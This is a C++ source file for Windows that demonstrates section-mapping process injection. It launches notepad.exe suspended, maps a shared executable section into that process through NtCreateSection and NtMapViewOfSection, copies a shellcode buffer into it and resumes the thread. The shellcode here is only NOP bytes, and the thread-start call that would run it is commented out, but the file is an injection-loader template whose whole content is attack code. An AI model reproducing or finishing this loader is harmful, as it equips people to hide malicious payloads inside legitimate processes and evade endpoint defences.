#include <iostream>
#include <windows.h>
#include "winternl.h"
#include <stdlib.h>
#include <stdio.h>

typedef enum _SECTION_INHERIT {

    ViewShare = 1,
    ViewUnmap = 2

} SECTION_INHERIT, *PSECTION_INHERIT;

using fNtCreateSection = NTSTATUS(WINAPI*)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE  FileHandle);
using fNtMapViewOfSection = NTSTATUS(WINAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

using MyRtlUserCreateThread = NTSTATUS(WINAPI*)(HANDLE ProcessHandle,PSECURITY_DESCRIPTOR SecurityDescriptor,BOOLEAN CreateSuspended,ULONG StackZeroBits,SIZE_T StackReserve,SIZE_T StackCommit,PVOID StartAddress,PVOID StartParameter,PHANDLE ThreadHandle,CLIENT_ID* ClientId);
using MyNtResumeThread = NTSTATUS(WINAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);

int main()
{
    char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

    fNtCreateSection NtCreateSection = (fNtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    fNtMapViewOfSection NtMapViewOfSection = (fNtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");

    HANDLE SectionHandle;
    size_t section_size = 4096;
    LARGE_INTEGER size = { section_size };
    SIZE_T viewSize = 0;

    SECTION_INHERIT Share = ViewShare;
    PVOID BaseAddressLocal = NULL;
    PVOID BaseAddressRemote = NULL;
    //LPCSTR AppName = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    LPCSTR cmd = "notepad.exe";
    LPSTR CmdLine = NULL;
    LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL;
    LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL;

    BOOL bInheritHandles = TRUE;
    DWORD dwCreationFlags = CREATE_SUSPENDED;
    LPVOID lpEnvironment = NULL;
    LPCSTR lpCurrentDirectory = NULL;

    STARTUPINFOA structStartupInfo = { sizeof(structStartupInfo)};
    PROCESS_INFORMATION structProcInfo;

    PSECURITY_DESCRIPTOR SecurityDescriptor = NULL;
    BOOLEAN CreateSuspended = FALSE;


    memset(&structStartupInfo, 0, sizeof(STARTUPINFO));
    structStartupInfo.cb = sizeof(STARTUPINFO);
    memset(&structProcInfo, 0, sizeof(PROCESS_INFORMATION));

    BOOL IsOpened = CreateProcessA(NULL, (LPSTR)cmd, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &structStartupInfo, &structProcInfo);
    HANDLE hProc = structProcInfo.hProcess;
    DWORD pid = structProcInfo.dwProcessId;
    HANDLE handleThread = structProcInfo.hThread;
    NTSTATUS CreateSection = NtCreateSection(&SectionHandle, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if (NT_SUCCESS(CreateSection))
    {
        printf("[+] Section Created Successfully\n");
    }

    if (NT_ERROR(CreateSection)) {
        printf("[-] Section Creation Failed\n");
    }

    NTSTATUS MapViewOfSection = NtMapViewOfSection(SectionHandle, GetCurrentProcess(), &BaseAddressLocal, 0, 0, NULL, &viewSize, ViewShare, NULL, PAGE_READWRITE);
    if (NT_SUCCESS(MapViewOfSection))
    {
        printf("[+] Section mapped successfully to local process at address: 0x%p\n", BaseAddressLocal);
    }

    if (NT_ERROR(MapViewOfSection))
    {
        printf("[-] Section was failed to be mapped to local process\n");
    }

    NTSTATUS RemoteMapViewOfSection = NtMapViewOfSection(SectionHandle, hProc, &BaseAddressRemote, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READ);
    if (NT_SUCCESS(RemoteMapViewOfSection))
    {
        printf("[+] Section mapped successfully to REMOTE process at address: 0x%p\n", BaseAddressRemote);
    }

    if (NT_ERROR(RemoteMapViewOfSection))
    {
        printf("[-] Section was failed to be mapped to REMOTE process\n");
    }

    memcpy(BaseAddressLocal, shellcode, sizeof(shellcode));

    //MyRtlUserCreateThread CreateThread = (MyRtlUserCreateThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserCreateThread");
    //NTSTATUS MyCreateThread = CreateThread(hProc, NULL, FALSE, 0, 0, 0, BaseAddressRemote, NULL, NULL, NULL);

    MyNtResumeThread FNtCreateThread = (MyNtResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");

    NTSTATUS FCreateThread = FNtCreateThread(handleThread, NULL);

    //Sleep(100000);
    return 0;

}